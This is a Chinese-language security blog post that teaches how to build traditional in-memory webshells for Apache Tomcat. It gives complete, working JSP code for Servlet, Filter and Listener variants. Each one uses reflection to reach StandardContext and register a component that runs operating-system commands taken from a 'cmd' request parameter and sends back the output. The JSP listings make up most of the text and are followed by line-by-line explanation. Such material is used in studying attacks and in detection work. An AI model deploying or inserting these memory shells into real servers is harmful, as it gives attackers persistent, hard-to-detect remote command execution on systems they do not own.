# Web传统内存马

  
  
&lt;!--more--&gt;  
## 传统 Web 内存马  
### Servlet内存马  
想要写一个`Servlet`内存马，需要经过如下步骤  
- 找到`StandardContext`  
- 继承并编写一个恶意`servlet`  
- 创建`Warpper`  
- 设置`Servlet`的`LoadOnStartUp`的值  
- 设置`Servlet`的`Name`  
- 设置`Servlet`对应的`Class`  
- 将`Servlet`添加到`context`的`children`中  
- 将`url`路径和`servlet`类做映射  
Demo  
```java  
&lt;%--  
  Created by IntelliJ IDEA.  
  User: f10wers13eicheng  
  Date: 2025/1/30  
  Time: 下午11:24  
  To change this template use File | Settings | File Templates.  
--%&gt;  
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;  
&lt;%@ page import=&#34;javax.servlet.Servlet&#34; %&gt;  
&lt;%@ page import=&#34;javax.servlet.ServletConfig&#34; %&gt;  
&lt;%@ page import=&#34;javax.servlet.ServletContext&#34; %&gt;  
&lt;%@ page import=&#34;javax.servlet.ServletRequest&#34; %&gt;  
&lt;%@ page import=&#34;javax.servlet.ServletResponse&#34; %&gt;  
&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;  
&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;  
&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;  
&lt;%@ page import=&#34;java.io.PrintWriter&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.Wrapper&#34; %&gt;  
&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;  
&lt;html&gt;  
&lt;head&gt;  
    &lt;title&gt;Servlet Demo&lt;/title&gt;  
&lt;/head&gt;  
&lt;body&gt;  
&lt;%  
    try {  
        ServletContext servletContext = request.getSession().getServletContext();  
        Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);  
        appctx.setAccessible(true);  
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
        Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);  
        stdctx.setAccessible(true);  
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
        String servletURL = &#34;/&#34; &#43; getRandomString();  
        String servletName = &#34;Servlet&#34; &#43; getRandomString();  
        Servlet servlet = new Servlet() {  
            @Override  
            public void init(ServletConfig servletConfig) {}  
            @Override  
            public ServletConfig getServletConfig() {  
                return null;  
            }  
            @Override  
            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {  
                String cmd = servletRequest.getParameter(&#34;cmd&#34;);  
                {  
                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();  
                    Scanner s = new Scanner(in, &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);  
                    String output = s.hasNext() ? s.next() : &#34;&#34;;  
                    servletResponse.setCharacterEncoding(&#34;GBK&#34;);  
                    PrintWriter out = servletResponse.getWriter();  
                    out.println(output);  
                    out.flush();  
                    out.close();  
                }  
            }  
            @Override  
            public String getServletInfo() {  
                return null;  
            }  
            @Override  
            public void destroy() {  
            }  
        };  
        Wrapper wrapper = standardContext.createWrapper();  
        wrapper.setName(servletName);  
        wrapper.setServlet(servlet);  
        wrapper.setServletClass(servlet.getClass().getName());  
        wrapper.setLoadOnStartup(1);  
        standardContext.addChild(wrapper);  
        standardContext.addServletMappingDecoded(servletURL, servletName);  
        response.getWriter().write(&#34;[&#43;] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#34; &#43; servletURL &#43; &#34;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#34; &#43; servletName &#43; &#34;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/&#34; &#43; servletURL &#43; &#34;?cmd=whoami&#34;);  
    } catch (Exception e) {  
        String errorMessage = e.getMessage();  
        response.setCharacterEncoding(&#34;UTF-8&#34;);  
        PrintWriter outError = response.getWriter();  
        outError.println(&#34;Error: &#34; &#43; errorMessage);  
        outError.flush();  
        outError.close();  
    }  
%&gt;  
&lt;/body&gt;  
&lt;/html&gt;  
&lt;%!  
    private String getRandomString() {  
        String characters = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;;  
        StringBuilder randomString = new StringBuilder();  
        for (int i = 0; i &lt; 8; i&#43;&#43;) {  
            int index = (int) (Math.random() * characters.length());  
            randomString.append(characters.charAt(index));  
        }  
        return randomString.toString();  
    }  
%&gt;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501302351120.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501302351775.png)
#### servlet内存马 demo 代码分析  
第一个：找到`StandardContext`，代码如下  
```java  
ServletContext servletContext = request.getSession().getServletContext();  
        Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);  
        appctx.setAccessible(true);  
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
        Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);  
        stdctx.setAccessible(true);  
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
```  
上述代码意思就是从当前`HttpServletRequest`中获取`ServletContext`对象，然后利用反射机制获取`ServletContext`类中名为`context`的私有字段，并赋值给`Field`类型的变量`appctx`，把这个变量的属性设置为可访问，这样可以通过反射获取它的值。接着继续使用反射机制来获取`ApplicationContext`类中名为`context`的私有字段，并赋值给`Field`类型的变量`stdctx`，同样将其设置为可访问；最后通过反射获取`ApplicationContext`对象的私有字段`context`的值，并将其强制类型转换为`StandardContext`，到这里，成功找到了`StandardContext`。  
接着第二个任务：继承并编写一个恶意`servlet`，代码如下  
```java  
Servlet servlet = new Servlet() {  
            @Override  
            public void init(ServletConfig servletConfig) {}  
            @Override  
            public ServletConfig getServletConfig() {  
                return null;  
            }  
            @Override  
            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {  
                String cmd = servletRequest.getParameter(&#34;cmd&#34;);  
                {  
                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();  
                    Scanner s = new Scanner(in, &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);  
                    String output = s.hasNext() ? s.next() : &#34;&#34;;  
                    servletResponse.setCharacterEncoding(&#34;GBK&#34;);  
                    PrintWriter out = servletResponse.getWriter();  
                    out.println(output);  
                    out.flush();  
                    out.close();  
                }  
            }  
            @Override  
            public String getServletInfo() {  
                return null;  
            }  
            @Override  
            public void destroy() {  
            }  
        };  
```  
接着后续的六个任务：创建`Wrapper`对象、设置`Servlet`的`LoadOnStartUp`的值，设置`Servlet`的`Name`、设置`Servlet`对应的`Class`、将`Servlet`添加到`context`的`children`中、将`url`路径和`servlet`类做映射  
```java  
Wrapper wrapper = standardContext.createWrapper();  
wrapper.setName(servletName);  
wrapper.setServlet(servlet);  
wrapper.setServletClass(servlet.getClass().getName());  
wrapper.setLoadOnStartup(1);  
standardContext.addChild(wrapper);  
standardContext.addServletMappingDecoded(servletURL, servletName);  
```  
其中`standardContext.addChild(wrapper);`是为了让我们自定义的`servlet`成为`Web`应用程序的一部分；然后`standardContext.addServletMappingDecoded(servletURL, servletName);`也可以写成如下形式  
```java  
// 要引入：&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationServletRegistration&#34; %&gt;  
ServletRegistration.Dynamic dynamic = new ApplicationServletRegistration(wrapper, standardContext);  
dynamic.addMapping(servletURL);  
```  
#### 关于StandardContext、ApplicationContext、ServletContext  
[https://yzddmr6.com/posts/tomcat-context/](https://yzddmr6.com/posts/tomcat-context/)  
[https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew](https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew)  
`ServletContext`是`Servlet`规范；`org.apache.catalina.core.ApplicationContext`是`ServletContext`的实现；`org.apache.catalina.Context`接口是`tomcat`容器结构中的一种容器，代表的是一个`web`应用程序，是`tomcat`独有的，其标准实现是`org.apache.catalina.core.StandardContext`，是`tomcat`容器的重要组成部分。  
关于`StandardContext`的获取方法，除了本文中提到的将`ServletContext`转为`StandardContext`从而获取到`context`这个方法，还有以下两种方法  
1. 从线程中获取StandardContext，参考Litch1师傅的文章：[https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A](https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A)  
2. 从MBean中获取，参考54simo师傅的文章：[https://scriptboy.cn/p/tomcat-filter-inject/，不过这位师傅的博客已经关闭了，我们可以看存档：https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/](https://scriptboy.cn/p/tomcat-filter-inject/%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%99%E4%BD%8D%E5%B8%88%E5%82%85%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%B7%B2%E7%BB%8F%E5%85%B3%E9%97%AD%E4%BA%86%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%AD%98%E6%A1%A3%EF%BC%9Ahttps://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/)  
3. 从spring运行时的上下文中获取，参考 LandGrey@奇安信观星实验室 师傅的文章：[https://www.anquanke.com/post/id/198886](https://www.anquanke.com/post/id/198886)  
### Filter内存马  
#### 简单的filter内存马  
- 获取`StandardContext`  
- 继承并编写一个恶意`filter`  
- 实例化一个`FilterDef`类，包装`filter`并放到`StandardContext.filterDefs`中  
- 实例化一个`FilterMap`类，将我们的`filter`和`urlpattern`相对应，使用`addFilterMapBefore`存放到`StandardContext.filterMaps`中  
- 通过反射获取`filterConfigs`，实例化一个`filterConfig`(`ApplicationFilterConfig`)类，传入`StandardContext`与`filterDefs`，存放到`filterConfig`中  
需要注意的是，一定要先修改`filterDef`，再修改`filterMap`，不然会抛出找不到`filterName`的异常。  
```java  
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;  
&lt;%@ page import=&#34;java.util.Map&#34; %&gt;  
&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;  
&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;  
&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;  
&lt;%@ page import=&#34;java.io.PrintWriter&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationFilterConfig&#34; %&gt;  
&lt;%@ page import=&#34;java.lang.reflect.Constructor&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.Context&#34; %&gt;  
&lt;%@ page import=&#34;java.util.List&#34; %&gt;  
&lt;%@ page import=&#34;java.util.ArrayList&#34; %&gt;  
&lt;%@ page import=&#34;javafx.application.Application&#34; %&gt;&lt;%--  
  Created by IntelliJ IDEA.  
  User: f10wers13eicheng  
  Date: 2025/1/31  
  Time: 下午7:53  
  To change this template use File | Settings | File Templates.  
--%&gt;  
&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;  
&lt;html&gt;  
&lt;head&gt;  
    &lt;title&gt;Title&lt;/title&gt;  
&lt;/head&gt;  
&lt;body&gt;  
&lt;%  
    ServletContext servletContext = request.getSession().getServletContext();  
    Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);  
    appctx.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
    Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);  
    stdctx.setAccessible(true);  
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
    Field filterConfigsField = standardContext.getClass().getDeclaredField(&#34;filterConfigs&#34;);  
    filterConfigsField.setAccessible(true);  
    Map filterConfigs = (Map) filterConfigsField.get(standardContext);  
    String filterName = getRandomString();  
    if(filterConfigs.get(filterName) == null){  
        Filter filter = new Filter(){  
  
            @Override  
            public void init(FilterConfig filterConfig) throws ServletException {  
  
            }  
  
            @Override  
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
                    HttpServletRequest request = (HttpServletRequest) servletRequest;  
                    String cmd = request.getParameter(&#34;cmd&#34;);  
                {  
                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();  
                    Scanner s = new Scanner(in,&#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);  
                    String output = s.hasNext() ? s.next() : &#34;&#34;;  
                    servletResponse.setCharacterEncoding(&#34;GBK&#34;);  
                    PrintWriter out = servletResponse.getWriter();  
                    out.print(output);  
                    out.flush();  
                    out.close();  
                }  
                filterChain.doFilter(request, servletResponse);  
            }  
            @Override  
            public void destroy() {  
  
            }  
        };  
        FilterDef filterDef = new FilterDef();  
        filterDef.setFilterName(filterName);  
        filterDef.setFilterClass(filter.getClass().getName());  
        filterDef.setFilter(filter);  
        standardContext.addFilterDef(filterDef);  
        FilterMap filterMap = new FilterMap();  
        filterMap.setFilterName(filterName);  
        filterMap.addURLPattern(&#34;/*&#34;);  
        filterMap.setDispatcher(DispatcherType.REQUEST.name());  
        standardContext.addFilterMap(filterMap);  
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);  
        constructor.setAccessible(true);  
        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);  
        filterConfigs.put(filterName, applicationFilterConfig);  
        out.print(&#34;[&#43;]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[&#43;]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &#34; &#43; filterName &#43; &#34;&lt;br&gt;[&#43;]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&#34;);  
    }  
%&gt;  
&lt;%!  
    private String getRandomString() {  
        String characters = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;;  
        StringBuilder randomString = new StringBuilder();  
        for (int i = 0; i &lt; 8; i&#43;&#43;) {  
            int index = (int) (Math.random() * characters.length());  
            randomString.append(characters.charAt(index));  
        }  
        return randomString.toString();  
    }  
%&gt;  
&lt;/body&gt;  
&lt;/html&gt;  
```  
#### filter内存马分析  
```java  
ServletContext servletContext = request.getSession().getServletContext();    
Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);    
appctx.setAccessible(true);    
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    
Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);    
stdctx.setAccessible(true);    
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    
Field filterConfigsField = standardContext.getClass().getDeclaredField(&#34;filterConfigs&#34;);    
filterConfigsField.setAccessible(true);    
Map filterConfigs = (Map) filterConfigsField.get(standardContext);  
```  
显示获取`servlet`上下文并拿到其私有字段`context`，然后设置可访问，这样就可以通过反射这个`context`字段的值，这个值是一个`ApplicationContext`对象；接着获取`ApplicationContext`的私有字段`context`并设置可访问，然后通过反射获取`ApplicationContext`的`context`字段的值，这个值是一个`StandardContext`对象；  
最后是获取`StandardContext`的私有字段`filterConfigs`，设置可访问之后通过反射获取`StandardContext`的`filterConfigs`字段的值  
中间构造恶意`filter`，并且在最后加上`filterChain.doFilter`  
```java  
FilterDef filterDef = new FilterDef();  
filterDef.setFilterName(filterName);  
filterDef.setFilterClass(filter.getClass().getName());  
filterDef.setFilter(filter);  
standardContext.addFilterDef(filterDef);  
FilterMap filterMap = new FilterMap();  
filterMap.setFilterName(filterName);  
filterMap.addURLPattern(&#34;/*&#34;);  
filterMap.setDispatcher(DispatcherType.REQUEST.name());  
standardContext.addFilterMapBefore(filterMap);  
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);  
constructor.setAccessible(true);  
ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);  
filterConfigs.put(filterName, applicationFilterConfig);  
```  
也就是定义`filterDef`和`filterMap`并加入到`standardContext`中，接着反射获取`ApplicationFilterConfig`类的构造函数并将构造函数设置可访问，然后创建了一个`ApplicationFilterConfig`对象的实例，接着将刚刚创建的实例添加到过滤器配置的`Map`中，`filterName`为键，这样就可以将动态创建的过滤器配置信息加入到应用程序的全局配置中。  
需要注意的是，在`tomcat 7`及以前`FilterDef`和`FilterMap`这两个类所属的包名是  
```java  
&lt;%@ page import=&#34;org.apache.catalina.deploy.FilterMap&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.deploy.FilterDef&#34; %&gt;  
```  
`tomcat 8`及以后，包名是这样的  
```java  
&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt;  
```  
### Listener内存马  
#### 简单的Listener内存马编写  
- 继承并编写一个恶意`Listener`  
- 获取`StandardContext`  
- 调用`StandardContext.addAPplicationEventListener()`并添加恶意`Listener`  
```java  
&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;  
&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;  
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;&lt;%--  
  Created by IntelliJ IDEA.  
  User: f10wers13eicheng  
  Date: 2025/1/31  
  Time: 下午8:33  
  To change this template use File | Settings | File Templates.  
--%&gt;  
&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;  
&lt;html&gt;  
&lt;head&gt;  
    &lt;title&gt;Title&lt;/title&gt;  
&lt;/head&gt;  
&lt;body&gt;  
&lt;%!  
    public class EvilListener implements ServletRequestListener {  
        public void requestDestroyed(ServletRequestEvent sre) {  
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();  
            if (req.getParameter(&#34;cmd&#34;) != null){  
                InputStream in = null;  
                try {  
                    in = Runtime.getRuntime().exec(req.getParameter(&#34;cmd&#34;)).getInputStream();  
                    Scanner s = new Scanner(in, &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);  
                    String out = s.hasNext()?s.next():&#34;&#34;;  
                    Field requestF = req.getClass().getDeclaredField(&#34;request&#34;);  
                    requestF.setAccessible(true);  
                    Request request = (Request)requestF.get(req);  
                    request.getResponse().setCharacterEncoding(&#34;GBK&#34;);  
                    request.getResponse().getWriter().write(out);  
                }  
                catch (Exception ignored) {}  
            }  
        }  
        public void requestInitialized(ServletRequestEvent sre) {}  
    }  
%&gt;  
&lt;%  
    Field reqF = request.getClass().getDeclaredField(&#34;request&#34;);  
    reqF.setAccessible(true);  
    Request req = (Request)reqF.get(request);  
    StandardContext context = (StandardContext) req.getContext();  
    EvilListener evilListener = new EvilListener();  
    context.addApplicationEventListener(evilListener);  
    out.println(&#34;[&#43;]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Inject Listener Memory Shell successfully!&lt;br&gt;[&#43;]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Shell url: http://localhost:8088/?cmd=whoami&#34;);  
%&gt;  
&lt;/body&gt;  
&lt;/html&gt;  
```  
#### Listener内存马代码分析  
```java  
Field reqF = request.getClass().getDeclaredField(&#34;request&#34;);  
reqF.setAccessible(true);  
Request req = (Request) reqF.get(request);  
StandardContext context = (StandardContext) req.getContext();  
EvilListener evilListener = new EvilListener();  
context.addApplicationEventListener(evilListener);  
```  
前面四行代码获取了`StandardContext`；后两行代码干了两件事：实例化编写的恶意`Listener`，调用`addApplicationEventListener`方法加入到`applicationEventListenersList`中去，这样最终就会到`eventListener`。  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/web%E4%BC%A0%E7%BB%9F%E5%86%85%E5%AD%98%E9%A9%AC/  

